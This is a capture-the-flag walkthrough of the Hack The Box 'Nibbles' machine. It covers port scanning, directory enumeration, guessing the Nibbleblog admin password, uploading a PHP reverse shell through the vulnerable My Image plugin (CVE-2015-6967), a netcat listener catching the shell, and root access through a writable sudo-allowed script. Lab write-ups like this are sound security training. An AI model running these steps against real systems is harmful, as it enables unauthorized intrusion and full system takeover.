---
title: "Hack The Box - Nibbbles"
date: 2022-06-24T17:56:18+05:30
draft: false
description: " Nibbles from HackTheBox is an retired machine which is vulnerable to File upload and security Misconfiguration, which can be easily exploited with publicly available scripts and Metasploit "
hideToc: false
tocPosition: outer
enableToc: true
enableTocContent: false
author: Atom
authorEmoji: ✍️
tags: 
- File upload Vulnarability
- Remote Code Execution
- Nibbleblog
- CVE-ID-2015-6967
- A06:2021-Vulnerable And Outdated Components
- Sudo Exploitation
series:
- Pratical Ethical Hacking TCM
categories:
- Easy
- HackTheBox
- Linux
- Metasploit
- Public Exploit
- CVE Exploitation
libraries:

image: /images/hackthebox/nibbles/Nibbles1.png 
---

Hi Hackers Welcome Back, Today we are going to look at Hack The Box Nibbles Machine.

{{< img src="/images/hackthebox/nibbles/nibbles.png" alt="image alt" width="450px"  position="center" >}}

## Info Table
<table style="width:100%">
 <thead>
  <tr>
    <th>Title</th>
    <th>Nibbles</th>
  </tr>
</thead>
<tr>
    <td>Category</td>
    <td>Hack The Box</td>
    </tr>
  <tr>
    <td>OS</td>
    <td>Linux</td>
    </tr>
  </tr>
   <tr>
    <td>Difficulty</td>
    <td>Easy</td>
    </tr>
    <tr>
    <td>Maker</td>
    <td><a href="https://www.hackthebox.eu/home/users/profile/2984"><img src="https://www.hackthebox.eu/badge/image/2984" alt="" style="display: unset"></a>  </td>
    </tr>
    <tr>
    </tr>
</table>

## Kill Chain Summery
While enumerating ports and services we can able to find the port 22,80 ware open. web service running on port 80, while digging into deep username and version of the theme found. guessed password, using file upload vulnerability we got initial foothold, escalated priviledge using sudo vulnerability. it  is vulnerable to  A06:2021-Vulnerable And Outdated Components which can be easily exploited via publicly available scripts and Metasploit. 

## Mind Map 
{{< img src="/images/hackthebox/nibbles/mm.png" alt="image alt" width="1000px"  position="center" >}}

## Recon 
Lets start with Initial scan.


```bash
┌─[_]─[atom@atom-vmwarevirtualplatform]─[~/htb/machines]
└──_ $sudo nmap -sC -sV -O 10.10.10.75 -oN initial.txt
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-17 16:50 IST
Nmap scan report for 10.10.10.75
Host is up (0.29s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=6/17%OT=22%CT=1%CU=41142%PV=Y%DS=2%DC=I%G=Y%TM=62AC63A
OS:E%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10A%TI=Z%CI=I%II=I%TS=8)OPS
OS:(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST1
OS:1NW7%O6=M505ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN
OS:(R=Y%DF=Y%T=40%W=7210%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.53 seconds
```

Lets we run Vuln script scan 

```bash
─[_]─[atom@atom-vmwarevirtualplatform]─[~/htb/machines]
└──_ $nmap -sC --script vuln -p 22,80 10.10.10.75 -oN vuln.txt                                                                                                                                                     
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-17 17:09 IST
Stats: 0:01:57 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 98.52% done; ETC: 17:11 (0:00:02 remaining)
Stats: 0:02:20 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 98.52% done; ETC: 17:11 (0:00:02 remaining)
Stats: 0:02:23 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 98.52% done; ETC: 17:11 (0:00:02 remaining)
Stats: 0:02:29 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 98.52% done; ETC: 17:11 (0:00:02 remaining)
Stats: 0:02:33 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 98.52% done; ETC: 17:11 (0:00:02 remaining)
Stats: 0:03:52 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 98.52% done; ETC: 17:12 (0:00:03 remaining)
Stats: 0:05:18 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.01% done; ETC: 17:14 (0:00:03 remaining)
Nmap scan report for 10.10.10.75
Host is up (0.32s latency).

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       http://ha.ckers.org/slowloris/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-csrf: Couldn't find any CSRF vulnerabilities.

Nmap done: 1 IP address (1 host up) scanned in 323.25 seconds
```

Only two ports are opened, just to conform on background we can all ports scan. 

```bash
┌─[atom@atom-vmwarevirtualplatform]─[~/htb/machines]
└──_ $sudo nmap -T4 -p- 10.10.10.75 -oN fs.nmap
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-17 16:56 IST
Stats: 0:00:22 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 6.30% done; ETC: 17:02 (0:05:27 remaining)
Stats: 0:02:34 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 13.50% done; ETC: 17:15 (0:16:27 remaining)
Stats: 0:04:35 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 25.93% done; ETC: 17:13 (0:13:05 remaining)
Stats: 0:11:56 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 63.51% done; ETC: 17:15 (0:06:51 remaining)
Stats: 0:15:20 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 79.79% done; ETC: 17:15 (0:03:53 remaining)
Nmap scan report for 10.10.10.75
Host is up (0.29s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 1209.69 seconds
```

From here we came to know that only port 22, 80 ware opened. port 22 is for SSH. we can able to do SSH if we know the user name and password or private key. port 80 is a web server, SSH creds may present  hidden some ware inside Web server directory,  lets we run Gobuster for directory busting.

if we inspect source code on home page we will get a clue to drive exploit  ``` http://10.10.10.75/ ```

```html
<b>Hello world!</b>

<!-- /nibbleblog/ directory. Nothing interesting here! -->
```

On comment we can see the clue ``` nibbleblog``` is a directory

```bash
┌─[atom@atom-vmwarevirtualplatform]─[~]
└──_ $gobuster dir -u http://10.10.10.75/nibbleblog/ --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.75/nibbleblog/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/06/18 11:19:34 Starting gobuster in directory enumeration mode
===============================================================
/content              (Status: 301) [Size: 323] [--> http://10.10.10.75/nibbleblog/content/]
/themes               (Status: 301) [Size: 322] [--> http://10.10.10.75/nibbleblog/themes/] 
/admin                (Status: 301) [Size: 321] [--> http://10.10.10.75/nibbleblog/admin/]  
/plugins              (Status: 301) [Size: 323] [--> http://10.10.10.75/nibbleblog/plugins/]
/README               (Status: 200) [Size: 4628]                                            
/languages            (Status: 301) [Size: 325] [--> http://10.10.10.75/nibbleblog/languages/]
                                                                                              
===============================================================
2022/06/18 12:19:35 Finished
===============================================================
```

while digging we can able to find username admin is available. ``` http://10.10.10.75/nibbleblog/content/private/users.xml ```

  

```html
<users>
<user username="admin">
<id type="integer">0</id>
<session_fail_count type="integer">0</session_fail_count>
<session_date type="integer">1514544131</session_date>
</user>
<blacklist type="string" ip="10.10.10.1">
<date type="integer">1512964659</date>
<fail_count type="integer">1</fail_count>
</blacklist>
</users>
```

On the following directory ```http://10.10.10.75/nibbleblog/README``` we can able to see the version of nibbling theme.

while digging into google we can see that there is one public exploit available.


{{< img src="/images/hackthebox/nibbles/1.png" alt="image alt" width="1000px"  position="center" >}}


It is vulnerable to ``` **CVE-2015-6967 ``` for this exploit we need a username and password. the good thing is we already know the username ``` admin ``` yet to find the password.**


{{< img src="/images/hackthebox/nibbles/2.png" alt="image alt" width="1000px"  position="center" >}}


The exploit is code execution vulnerability via  image file upload 



{{< img src="/images/hackthebox/nibbles/3.png" alt="image alt" width="1000px"  position="center" >}}


- Information gathered
- It’s a code execution vulnerability.
- The vulnerability is in the “My image” plugin that allows the upload of PHP files. So it would allow us to upload a PHP reverse shell.
- it is an authenticated vulnerability we need username and password to exploit. we know the username

Alright, so the next steps would be:

- Navigate to the admin login page and figure out the admin credentials
- Navigate to the My Image plugin page and upload a PHP reverse shell

As mentioned in the Proof of Concept, the admin page can be found here.

## Initial Foot Hold 
``` [http://10.10.10.75/nibbleblog/admin.php](http://10.10.10.75/nibbleblog/admin.php) ```

{{< img src="/images/hackthebox/nibbles/4.png" alt="image alt" width="1000px"  position="center" >}}

Now we need admin credentials. When I’m presented with an enter credentials page, the first thing I try is common credentials (admin/admin, admin/nibbles, nibbles/nibbles, nibbles/admin). If that doesn’t work out, I look for default credentials online that are specific to the technology. Last, I use a password cracker if all else fails.

In this case, the common credentials admin/nibbles worked!.  Next, we need to navigate to the My Image plugin. Click on Plugins > My image > Configure.

navigate to ```/usr/share/webshell/php/PHP-revershshell.php ``` modify the code according to our needs.

{{< img src="/images/hackthebox/nibbles/5.png" alt="image alt" width="1000px"  position="center" >}}

Call the payload we uploaded via browser

```python
http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php
```

```python
┌─[atom@atom-vmwarevirtualplatform]─[~]
└──╼ $nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.10.75] 50960
Linux Nibbles 4.4.0-104-generic #127-Ubuntu SMP Mon Dec 11 12:16:42 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 21:53:12 up  4:19,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
$ whoami
nibbler
$
```

Let’s first upgrade to a better shell. Python is not installed but python 3 is.

```python
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

user flag 

```python
nibbler@Nibbles:/home/nibbler$ cat user.txt
cat user.txt
5e59ab4fecbdeacb7070326561f7ec02
nibbler@Nibbles:/home/nibbler$
```

## Privilege escalation

```python
nibbler@Nibbles:/home/nibbler$ sudo -l
sudo -l
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

While enumerating. There is no such file and directory names ``` /personal/stuff/monitor.sh ```  create and invoke bash command 

```python
nibbler@Nibbles:/home/nibbler/personal/stuff$ echo " bash " > monitor.sh
echo " bash " > monitor.sh
nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo ./monitor.sh
sudo ./monitor.sh
root@Nibbles:/home/nibbler/personal/stuff# whoami
whoami
root
root@Nibbles:/home/nibbler/personal/stuff#
```


{{< notice success "we have successfully owned " >}}
See you on the next Blog, Happy hacking...
{{< /notice >}}